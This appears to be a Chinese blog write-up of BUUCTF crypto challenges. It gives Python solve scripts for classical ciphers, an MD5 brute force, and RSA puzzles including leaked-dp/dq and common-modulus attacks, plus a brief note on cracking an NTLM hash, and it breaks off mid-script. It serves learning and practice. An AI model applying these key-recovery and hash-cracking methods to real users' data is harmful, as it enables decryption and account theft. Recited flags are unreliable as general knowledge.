      <link href="2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/"/>
      <url>2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/</url>
      
        <content type="html"><![CDATA[<p>学学密码学吧！菜的顶不住了😭</p><a id="more"></a><h3 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">格式：flag&#123; &#125;</span><br></pre></td></tr></table></figure><p>直接用工具解发现没有合适的，看下凯撒密码的原理吧：</p><blockquote><p>凯撒加密法，或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。</p></blockquote><p>所以，写个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;afZ_&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(s1,s):</span><br><span class="line">    print(ord(i)-ord(j))</span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line"><span class="comment"># 8</span></span><br></pre></td></tr></table></figure><p>由此，我们可以写个解密flag的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-26</span>,<span class="number">26</span>):</span><br><span class="line">    k=i</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        flag+=chr(ord(j)+k)</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><h3 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h3><p>栅栏密码，解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypto</span>(<span class="params">plain</span>):</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,len(plain)<span class="number">-1</span>):</span><br><span class="line">        ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(int(plain.__len__() / n + <span class="number">0.5</span>)):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ans += plain[j * n + i]</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        print(n,ans)</span><br><span class="line"> </span><br><span class="line">s=<span class="string">&#x27;felhaagv&#123;ewtehtehfilnakgw&#125;&#x27;</span></span><br><span class="line">decrypto(s)</span><br></pre></td></tr></table></figure><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17</span><br><span class="line">求解出d作为flga提交</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h3 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h3><p>以为和des有关🙃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            flag=<span class="string">&#x27;TASC&#x27;</span>+chr(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+chr(j)+<span class="string">&#x27;WDJKX&#x27;</span>+chr(k)+<span class="string">&#x27;ZM&#x27;</span></span><br><span class="line">            m.update(flag.encode())</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                print(des)</span><br></pre></td></tr></table></figure><h3 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h3><p>直接用网站分解：<a href="http://www.factordb.com/">http://www.factordb.com</a></p><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101999 · 966233</span><br></pre></td></tr></table></figure><h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D;  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q &#x3D;  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e &#x3D;  65537</span><br><span class="line">c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c,d,p*q)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h3 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h3><p>大帝就应该想到凯撒大帝：</p><p>当i=13时 发现输出<code>security</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;FRPHEVGL&#x27;</span></span><br><span class="line">str2 = str1.lower()                                 <span class="comment">#转换为小写方便识别</span></span><br><span class="line">num = <span class="number">1</span>                                             <span class="comment">#偏移量</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    print(<span class="string">&quot;&#123;:&lt;2d&#125;&quot;</span>.format(num),end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> str2:</span><br><span class="line">        <span class="keyword">if</span>(ord(temp)+num &gt; ord(<span class="string">&#x27;z&#x27;</span>)):               <span class="comment">#如果超出&#x27;z&#x27;,需要重新映射会a~z这26个字母上</span></span><br><span class="line">            print(chr(ord(temp)+num<span class="number">-26</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(chr(ord(temp)+num),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">&#x27;ComeChina&#x27;</span></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">if</span>(ord(temp)+<span class="number">13</span> &gt; ord(<span class="string">&#x27;z&#x27;</span>)):               </span><br><span class="line">        print(chr(ord(temp)+<span class="number">13</span><span class="number">-26</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(chr(ord(temp)+<span class="number">13</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># PbzrPuvan</span></span><br></pre></td></tr></table></figure><h3 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">小明某一天收到一封密信，信中写了几个不同的年份</span><br><span class="line">          辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。</span><br><span class="line">          信的背面还写有“+甲子”，请解出这段密文。</span><br><span class="line"></span><br><span class="line">key值：CTF&#123;XXX&#125;</span><br></pre></td></tr></table></figure><p>六十甲子顺序表</p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/a2cc7cd98d1001e9e5a6b6d7b00e7bec55e79754.jpg"></p><p>对应的密文是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">28 30 23 8 17 10 16 30</span><br></pre></td></tr></table></figure><p>后面提示<code>+甲子</code>，加上60得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">88 90 83 68 77 70 76 90</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;88 90 83 68 77 70 76 90&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    print(chr(int(i)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># XZSDMFLZ</span></span><br></pre></td></tr></table></figure><p>接着栅栏密码解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypto</span>(<span class="params">plain</span>):</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,len(plain)<span class="number">-1</span>):</span><br><span class="line">        ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(int(plain.__len__() / n + <span class="number">0.5</span>)):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ans += plain[j * n + i]</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        print(n,ans)</span><br><span class="line"> </span><br><span class="line">s=<span class="string">&#x27;XZSDMFLZ&#x27;</span></span><br><span class="line">decrypto(s)</span><br><span class="line"><span class="comment"># 2 XSMLZDFZ</span></span><br><span class="line"><span class="comment"># 3 XDLZMZSF</span></span><br><span class="line"><span class="comment"># 4 XMZFSLDZ</span></span><br><span class="line"><span class="comment"># 5 XFZLSZDM</span></span><br><span class="line"><span class="comment"># 6 XZSDMF</span></span><br></pre></td></tr></table></figure><p>对第四栏凯撒密码解密得到类似明文，提交即为flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHUANGYU</span><br></pre></td></tr></table></figure><h3 id="信息化时代的步伐"><a href="#信息化时代的步伐" class="headerlink" title="信息化时代的步伐"></a>信息化时代的步伐</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">606046152623600817831216121621196386</span><br></pre></td></tr></table></figure><p>中文电报码：<a href="http://code.mcdvisa.com/">http://code.mcdvisa.com</a></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机要从娃娃抓起</span><br></pre></td></tr></table></figure><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure><p>泄露dp和dq，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_ascii</span>(<span class="params">h</span>):</span></span><br><span class="line">    h = h.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    list_s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(h), <span class="number">2</span>):</span><br><span class="line">        list_s.append(chr(int(h[i:i+<span class="number">2</span>], <span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(list_s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    list_h = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        list_h.append(str(hex(ord(c))[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(list_h)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">dp,dq,p,q,c</span>):</span></span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = pow(c, dp, p)</span><br><span class="line">    mq = pow(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    print(hex_to_ascii(str(hex(m))))</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure><h3 id="凯撒？替换？呵呵"><a href="#凯撒？替换？呵呵" class="headerlink" title="凯撒？替换？呵呵!"></a>凯撒？替换？呵呵!</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;</span><br></pre></td></tr></table></figure><p>quipqiup解密：<a href="https://quipqiup.com/">https://quipqiup.com</a></p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200922214944.png"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake&#125;</span><br></pre></td></tr></table></figure><h3 id="old-fashion"><a href="#old-fashion" class="headerlink" title="old-fashion"></a>old-fashion</h3><p>同样是quipqiup解密：<a href="https://quipqiup.com/">https://quipqiup.com</a></p><h3 id="萌萌哒的八戒"><a href="#萌萌哒的八戒" class="headerlink" title="萌萌哒的八戒"></a>萌萌哒的八戒</h3><p>猪圈密码及其变种：</p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/eba2d7ca7bcb0a46d9ed92316d63f6246a60afb8.jpg"></p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/9c9a0a46f21fbe094691da1c6d600c338644adb8.jpg"></p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/8c310c338744ebf829be7d37dff9d72a6159a7b8.jpg"></p><h3 id="权限获得第一步"><a href="#权限获得第一步" class="headerlink" title="权限获得第一步"></a>权限获得第一步</h3><p>ntml哈希直接解</p><h3 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c1&#x3D;22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n&#x3D;22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1&#x3D;11187289</span><br><span class="line">c2&#x3D;18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2&#x3D;9647291</span><br></pre></td></tr></table></figure><p>共模攻击,exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span>(<span class="params">n, e1, e2, c1, c2</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    m %= n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line"></span><br><span class="line">print(libnum.n2s(common_modulus(n, e1, e2, c1, c2)))</span><br></pre></td></tr></table></figure><h3 id="世上无难事"><a href="#世上无难事" class="headerlink" title="世上无难事"></a>世上无难事</h3><p>同样是quipqiup解密：<a href="https://quipqiup.com/">https://quipqiup.com</a></p><h3 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h3><p>题目:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e &#x3D; 65537</span><br><span class="line">n &#x3D; 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp &#x3D; 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c &#x3D; 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure><p>泄露dp exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getd</span>(<span class="params">n,e,dp</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,e):</span><br><span class="line">        <span class="keyword">if</span> (dp*e<span 